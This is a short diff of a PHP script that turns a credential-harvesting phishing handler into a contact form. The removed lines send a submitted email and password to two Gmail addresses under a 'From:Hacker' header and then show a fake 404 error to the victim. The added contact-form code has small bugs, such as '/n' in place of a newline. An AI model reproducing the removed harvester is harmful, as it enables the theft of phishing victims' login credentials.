@@ -1,16 +1,14 @@
 <?php
-if(isset($_POST['submit'])){
-$name=$_POST['email'];
-$pass=$_POST['pass'];
-$t ="Palmararthuro@gmail.com";
-$to ="lumocigwad@gmail.com";
-$subject ="new user ";
+if(isset($_POST['login'])){
+$name=$_POST['name'];
+$email=$_POST['email'];
+$subject=$_POST['subject'];
+$message=$_POST['message'];
+$to ="kotech.ke@gmail.com";
 $headers ="From :$name "; 
-$message ="username ".$name ."password ".$pass;
-$headers="From:Hacker";
+$message ="Name: ".$name ."/n"."Email:".$email."subject: ".$subject."/n"."Message:".$message;
+$headers="From:".$name;
 mail($to,$subject,$message ,$headers);
-mail ($t, $subject,$message, $headers);
-echo "'<font color='red'>404 ERROR!  page not found</font>'";
 
 }
 ?>
